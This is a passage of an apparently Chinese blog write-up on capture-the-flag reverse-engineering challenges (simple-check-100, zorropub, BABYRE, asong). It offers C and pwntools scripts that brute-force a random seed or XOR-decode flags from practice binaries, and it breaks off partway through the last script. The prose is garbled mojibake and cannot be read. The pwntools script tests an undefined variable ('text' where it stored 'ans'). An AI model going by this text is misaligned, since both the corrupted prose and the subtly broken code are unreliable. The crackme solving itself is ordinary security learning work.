src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506201841271-1592290342688.png" alt="image-20200506201841271"></p><p>æ ¹æ®æˆ‘ä»¬æ‰“æ¸¸æˆçš„ç†Ÿæ‚‰ aswd ,æœç€1èµ°åˆ°æœ€å.  <strong>ssddwdwdddsssaasasaaassddddwdds</strong> æœ€ååœ¨linuxä¸‹è¾“å…¥.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200504140433640-1592290514404.png" alt="image-20200504140433640"></p><p><strong>æ€»ç»“: æ›´åŠ ç†Ÿæ‚‰äº†linuxåŠ¨æ€è°ƒè¯•çš„è¿ç”¨,  åŠ æ·±äº†æ•°ç»„æŒ‡é’ˆçš„ç†è§£.</strong></p><h3 id="simple-check-100"><a href="#simple-check-100" class="headerlink" title="simple-check-100"></a>simple-check-100</h3><p>é¢˜ç›®æœ¬æ¥å¾ˆç®€å•, ä½†æ˜¯æœ‰å‘å•Šâ€¦</p><p>é¦–å…ˆ, é¢˜ç›®ä¸‹è½½ä¸‹æ¥, æœ‰ä¸‰ä¸ªç‰ˆæœ¬. ä¸‹æ„è¯†çš„é€‰æ‹©äº†ç†Ÿæ‚‰çš„.exeæ¥åˆ†æ. </p><p>æŸ¥å£³æ— å£³, ç”¨idaæ‰“å¼€. ç¬¬ä¸€ç›´è§‰å°±æ˜¯è¿™ä¸ªæœ€åçš„flagä¸æˆ‘ä»¬è¾“å…¥å­—ç¬¦æ²¡å…³ç³», ç›´æ¥ODåŠ¨æ€è°ƒè¯•è·³è¿‡åˆ¤æ–­æ¡ä»¶å°±å¥½äº†.</p><p>è¿˜æ˜¯å…ˆç»†çœ‹ä¸€ä¸‹æ ˆç©ºé—´, è™½ç„¶è¿˜æ˜¯å’Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦æ²¡æœ‰å…³ç³». ä½†æ˜¯æœ‰é—®é¢˜å•Š,è¦ç”¨çš„åœ°å€äº¤å‰äº†.  æƒ³ç€ä¸‡ä¸€é¢˜å°±æ˜¯è¿™æ ·å‘¢, å…ˆå–ODè¯•ä¸€ä¸‹. ä¸å‡ºæ‰€æ–™, ä¹±ç ğŸ˜¢ </p><p>å¼€å§‹ä»”ç»†åˆ†æä¸‹è¿™ä¸ªé¢˜çš„æ ˆç©ºé—´, åœ¨ODåå¤è°ƒè¯•, å‘ç°æˆ‘ä»¬è¾“å…¥å­—ç¬¦çš„ç©ºé—´åªæœ‰19ä¸ªå­—èŠ‚å•Š, ä¸ºä»€ä¹ˆæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦æ ˆç©ºé—´åœ¨ODä¸­è°ƒè¯•æœ‰19+32 = 51å­—èŠ‚ç©ºé—´.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506144401943-1592290592390.png" alt="image-20200506144401943"></p><p>çœ‹äº†åŠå¤©ä¸çŸ¥é“ä¸ºä»€ä¹ˆ, åé¢æ‰çœ‹è§ç¨‹åºä¸‹é¢æœ‰  <strong>v3 = alloca(32);</strong> ç™¾åº¦äº†ä¸€ä¸‹, è¿™ä¸ªæ˜¯å†æ ˆä¸Šç”³è¯·ç©ºé—´çš„å‡½æ•°. æ­£å¥½æ˜¯å¤šå‡ºæ¥çš„32. </p><p>ç»è¿‡åå¤è°ƒè¯•, è¿™ä¸ªé¢˜æ€ä¹ˆä¹Ÿå’Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦æ²¡å…³ç³»å•Š, ç¨‹åºæ¯æ¬¡è¿‡äº†åˆ¤æ–­æ¡ä»¶, ç®—çš„éƒ½ä¸€æ ·. çœŸçš„å¥‡æ€ªäº†.</p><p>æœ€åæ²¡åŠæ³•äº†,æƒ³ä¸é€š.  å°±æœ€åå†æŠŠæ–‡ä»¶ä¸­è¿™ä¸ªç¨‹åºçš„linuxç‰ˆæœ¬è½½å…¥idaçœ‹çœ‹,  å—¯â€¦.è¿™ä¸ªç‰ˆæœ¬çš„æ ˆç©ºé—´å°±æ²¡æœ‰äº¤å‰. v7ä¸€ç›´åˆ°v34, æ²¡æœ‰åƒPEæ–‡ä»¶é‚£ä¸ªç‰ˆæœ¬åœ¨ä¸­é—´å¤šä¸€ä¸ªæŒ‡é’ˆ.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506145151730-1592290606770.png" alt="image-20200506145151730"></p><p>åœ¨linuxä¸‹åŠ¨æ€è°ƒè¯•.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506145627945-1592290617965.png" alt="image-20200506145627945"></p><p>ğŸ˜‚ä»€ä¹ˆé¬¼é¢˜. PEæ–‡ä»¶ç‰ˆæœ¬å±…ç„¶æ˜¯æœ‰é—®é¢˜çš„!!!</p><p><strong>æ€»ç»“: æ–‡ä»¶æœ‰å¤šä¸ªç‰ˆæœ¬çš„æ—¶å€™, æ³¨æ„!!! å¼ è§è¯†äº†. è™½ç„¶å¤šèŠ±äº†æ—¶é—´åœ¨PEä¸Šè€—, ä½†æ˜¯å¯¹æ ˆæ›´æ¸…æ¥šäº†.</strong></p><hr><h3 id="zorropub"><a href="#zorropub" class="headerlink" title="zorropub"></a>zorropub</h3><p>æŸ¥å£³æŸ¥ä½æ•°åè½½å…¥ida, æ•´ä½“æ€è·¯å¦‚ä¸‹.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200508104152981-1592290667231.png" alt="image-20200508104152981"></p><p>é‚£å…¶å®æˆ‘ä»¬æ˜¯ä¸ç”¨ç®¡è¿™ä¸ª MD5 åŠ å¯†çš„ , ä¹Ÿä¸ä¼šè¿™ä¸ªè§£å¯†.  ç›´æ¥çˆ†ç ´æ‰¾åˆ° <strong>i</strong> å€¼ä»è€Œå¾—åˆ°éšæœºæ•°ç§å­.</p><p>é‚£é—®é¢˜æ¥äº†, çˆ†ç ´æ‰¾äº†ä¸€ä¸ª <strong>i</strong> å€¼æ˜¯1023, å°±åœ¨linuxå†™äº†exp(<strong>ä¸èƒ½åœ¨windowä¸‹, å› ä¸ºç”Ÿæˆéšæœºæ•°ä¸åŒ</strong>). ä½†å¾—åˆ°çš„æ•°æ®éƒ½æ˜¯ä¹±ç çš„, æˆ‘è¿˜æ˜¯ä¸€ç›´ä»¥ä¸ºé—®é¢˜å‡ºç°åœ¨ <strong>LOBYTE(å–æœ€ä½å­—èŠ‚ä½)</strong> å› ä¸ºç¬¬ä¸€æ¬¡æ¥è§¦. </p><p>æœ€åæ‰æƒ³èµ·é‚£ä¸ª <strong>i</strong> çš„å€¼, å®ƒå¯èƒ½ä¸æ˜¯å”¯ä¸€çš„. å¼€å§‹å†™exp, å–å¤§èŒƒå›´çš„æ•°æ®çˆ†ç ´, æœç„¶å¯¹äº†â€¦â€¦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> *c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">0</span>, f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">srand(a);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                b = rand()%<span class="number">1000</span>;</span><br><span class="line">                flag[i] = b^c[<span class="number">4</span>*i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(flag[i] &gt; <span class="number">126</span> || flag[i] &lt; <span class="number">32</span>)</span><br><span class="line">f = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!f)</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, b = <span class="number">0</span>, j = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000</span>] = &#123;</span><br><span class="line">  <span class="number">200</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">50</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">206</span>,   <span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">  <span class="number">184</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">126</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">136</span>,   <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">73</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">   <span class="number">94</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">52</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">84</span>,   <span class="number">3</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">163</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">150</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">   <span class="number">64</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">40</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">252</span>,   <span class="number">2</span>,</span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">142</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">   <span class="number">38</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">27</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">42</span>,   <span class="number">3</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">245</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">95</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">  <span class="number">104</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">235</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">121</span>,   <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">29</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">78</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = i;</span><br><span class="line"><span class="keyword">while</span>(j)</span><br><span class="line">&#123;</span><br><span class="line">cnt++;</span><br><span class="line">j &amp;= j<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(cnt &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(cnt == <span class="number">10</span>)</span><br><span class="line">func(i,  a);</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200508105155224-1592290710459.png" alt="image-20200508105155224"></p><p>ç„¶ååšå®Œ, è¿˜æ˜¯å»çœ‹çœ‹å¤§ä½¬çš„writeup. æƒ³çœ‹çœ‹é‚£ä¸ªmd5æ€è§£å¯†, ä½†æ˜¯æ²¡æœ‰.  å´å‘ç°å¥½å¤šéƒ½æ˜¯ç”¨çš„pwntoolså·¥å…·æ¥çˆ†ç ´çš„, è‡ªå·±ä¹Ÿå»è¯•äº†ä¸‹, ç¡®å®ç®€å•å¾ˆå¤š.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">a = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>, <span class="number">0xffff</span>):</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    j = i</span><br><span class="line">    <span class="keyword">while</span>(j):</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        j &amp;= j<span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> cnt == <span class="number">10</span>:</span><br><span class="line">        a.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p = process(<span class="string">"./11"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line">    ans = p.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"NULL"</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">print</span> (text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“: (1)æ—¢ç„¶æ˜¯çˆ†ç ´å°±è¦æ³¨æ„æœ‰å¤šç§æƒ…å†µ (2) LOBYTE æ˜¯idaçš„å®å®šä¹‰, å–æœ€ä½å­—èŠ‚ä½. (3)æ›´åŠ ç†Ÿæ‚‰pwntoolså·¥å…·çš„ä½¿ç”¨.</strong></p><h3 id="BABYRE"><a href="#BABYRE" class="headerlink" title="BABYRE"></a>BABYRE</h3><p>é¢˜ç›®ä¸éš¾, ä½†æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°è¿™æ ·çš„é¢˜.</p><p>64ä½elfæ–‡ä»¶, idaæ‰“å¼€å, å’Œä»¥å¾€çš„æ–‡ä»¶ä¸ä¸€æ ·, å¼€å§‹æœ‰ä¸€æ®µå¾ªç¯è®¡ç®—èµ‹å€¼çš„æ“ä½œ,ä½†æ˜¯åˆæ˜¯çœ‹ä¸åˆ°åˆ°åº•æ˜¯èµ‹å€¼ç»™äº†è°.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200512134025680-1592290738761.png" alt="image-20200512134025680"></p><p>é‚£å°±åŠ¨æ€è°ƒè¯•è·Ÿæ¥çœ‹çœ‹, åˆ°äº†åˆ¤æ–­æ¡ä»¶çš„æ—¶å€™. æ˜ç™½äº†å°±æ˜¯ç±»ä¼¼åŠ å£³çš„ç¨‹åºæ‰“å¼€ä¼šå…ˆè¿›è¡Œè§£å‹ç”Ÿæˆä»£ç . è¿™é‡Œå¼€å§‹é‚£ä¸€æ®µå¾ªç¯ä½œç”¨, å°±æ”¹å˜æˆ‘ä»¬ä»£ç çš„.</p><p>è·Ÿè¿›åˆ¤æ–­å‡½æ•°, ç®—æ³•å¾ˆç®€å•,ç›´æ¥è¯»æ±‡ç¼–,  å°±æ˜¯ä¸€ä¸ªå¼‚æˆ–æ“ä½œç„¶åå¯¹æ¯”. </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200512133918795-1592290773581.png" alt="image-20200512133918795"></p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0x66</span>, <span class="number">0x6D</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x7F</span>, <span class="number">0x6B</span>, <span class="number">0x37</span>, <span class="number">0x64</span>,  <span class="number">0x3B</span>, <span class="number">0x56</span>, <span class="number">0x60</span>, <span class="number">0x3B</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = a[i] ^ i; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“: ç®—æ˜¯é•¿è§è¯†å§.</strong></p><p>æ”»é˜²ä¸–ç•Œåˆ·é¢˜è®°å½•ï¼ˆ4ï¼‰ã€‚<!-- more --></p><h3 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h3><h4 id="0x1åˆ†æ"><a href="#0x1åˆ†æ" class="headerlink" title="0x1åˆ†æ"></a>0x1åˆ†æ</h4><p>ä¸‹è½½ä¸‹æ¥ä¸‰ä¸ªæ–‡ä»¶ã€‚</p><p>ä¾æ¬¡çœ‹äº†ä¸‹, ä¸€ä¸ª64ä½elfæ–‡ä»¶æ— å£³, 2ä¸ªæ–‡æœ¬æ–‡ä»¶.  æ‰“å¼€æ–‡æœ¬æ–‡ä»¶å,æ²¡æœ‰å¤´ç»ª.  å°†elfæ–‡ä»¶è½½å…¥idaã€‚</p><p>æ•´ä¸ªæµç¨‹å¼€å§‹çœ‹ä¸æ¸…æ¥šåšä»€ä¹ˆ, å¤šçœ‹å‡ æ¬¡æ˜ç™½äº†. å…ˆè¾“å…¥å­—ç¬¦ä¸², æ‰“å¼€ä¸€ä¸ªthat_girlæ–‡ä»¶è¯»ä¿¡æ¯, æœ€åå‘outæ–‡ä»¶å†™ä¿¡æ¯. ä½†è¿™æ€ä¹ˆå’Œflagè”ç³»èµ·æ¥å‘¢.  å…¶å®é‚£ä¸ªoutæ–‡ä»¶é‡Œçš„å°±æ˜¯å¯†æ–‡, æˆ‘ä»¬æ‰¾åˆ°é€†å‘ç®—æ³•, é€šè¿‡å¯†æ–‡æ±‚å‡ºæ˜æ–‡(å³æˆ‘ä»¬çš„è¾“å…¥, ä¹Ÿæ˜¯flag) </p><p>ä¸‹é¢å…·ä½“åˆ†ææ¯ä¸ªå‡½æ•°. ç¬¬ä¸€å‡½æ•°: <strong>sub_400B4C</strong> ç”±äºå¾ˆç®€å•, ç›´æ¥ç»™å‡ºå‡½æ•°åŠŸèƒ½.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515112040201-1591166378815.png" alt="image-20200515112040201"></p><p><strong>sub_400B4C</strong>: å…ˆåˆ¤æ–­, å†å– { } ä¹‹é—´çš„å†…å®¹.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515112333168-1591166382914.png" alt="image-20200515112333168"></p><p>ä¸‹é¢ä¸‹ä¸€ä¸ªå‡½æ•°,  ç–‘é—®ï¼š<strong>v4å“ªé‡Œæ¥çš„åŠ ++*(_DWORD *)(4LL * v2 + v4);è¯­å¥çš„ä½œç”¨</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515113837252-1591166387143.png" alt="image-20200515113837252"></p><p><strong>sub_400936(&amp;buf)</strong>:</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515170301682-1591166983676.png" alt="image-20200515170301682"></p><p>ç¬¬ä¸€æ¬¡é‡åˆ°, æ²¡æœ‰ç»éªŒ, åæ¥æ‰æƒ³åˆ°é€šè¿‡æ±‡ç¼–çš„æŸ¥çœ‹, v4å³æ˜¯æˆ‘ä»¬ä¼ äº†å‚æ•° a2(ä¹Ÿå°±æ˜¯ä¸»å‡½æ•°çš„v3), è¿™æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’. 64ä½ä¸32ä½ç¨‹åºçš„åŒºåˆ«. ä½†è¯¥è¯­å¥åŠŸèƒ½è¿˜ä¸æ˜¯å¾ˆæ¸…æ¥š.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515114501031-1591166391168.png" alt="image-20200515114501031"></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515114755333-1591166411300.png" alt="image-20200515114755333"></p><p>ç»§ç»­çœ‹ä¸‹ä¸€ä¸ªå‡½æ•°<strong>sub_400E54</strong>:  çœ‹åˆ°è¿™é‡Œ, å°±å¾ˆæ¸…æ™°äº†,  å°±æ˜¯å…ˆé€šè¿‡ç»Ÿè®¡<strong>that_girl</strong>æ–‡ä»¶ä¸­æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°, ç„¶åæŒ‰ç…§ä¸€å®šçš„é¡ºåºè¾“å…¥å­—ç¬¦, æŠŠæ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°æŒ‰ä¸€å®šé¡ºåºç»™ä¸‹é¢çš„ v5 æ•°ç»„èµ‹å€¼.<strong>é‚£æ‰€ä»¥sub_400936è½¬æ¢å­—ç¬¦å‡½æ•°æˆ‘ä»¬æ˜¯ä¸ç”¨ç®¡çš„.</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515115440782-1591166415194.png" alt="image-20200515115440782"></p><p>ä¸‹é¢æ˜¯2ä¸ªåŠ å¯†å‡½æ•°,  æˆ‘ç®—æ³•å¤ªèœ, é€†ç®—æ³•æƒ³åŠå¤©ğŸ˜…, é¦–å…ˆ<strong>sub_400D33((unsigned __int8 *)v5);</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515120938171-1591166420082.png" alt="image-20200515120938171"></p><p>ç„¶å <strong>sub_400DB4(v5, v4);</strong> è§£é‡Šèµ·æ¥æœ‰ç‚¹æŠ½è±¡â€¦â€¦æ³¨æ„æ˜¯ä¸€ä¸ªå­—èŠ‚, æ‰€ä»¥å¤šå‡ºçš„ä½è¦èˆå¼ƒ<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515125253662-1591166423427.png" alt="image-20200515125253662"></p><p>ä¸¾ä¸ªä¾‹å­:</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515134001272-1591166447078.png" alt="image-20200515134001272"></p><p>æœ€åä¸€ä¸ªå‡½æ•°: <strong>sub_400CC0((__int64)v5, â€œoutâ€, v4);</strong>å°†åŠ å¯†åçš„å€¼å†™å…¥ outæ–‡ä»¶. </p><h4 id="0x2é€†å‘è§£å¯†"><a href="#0x2é€†å‘è§£å¯†" class="headerlink" title="0x2é€†å‘è§£å¯†"></a>0x2é€†å‘è§£å¯†</h4><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida[<span class="number">152</span>];</span><br><span class="line"><span class="keyword">int</span> change[<span class="number">38</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">   <span class="number">22</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">6</span>,   <span 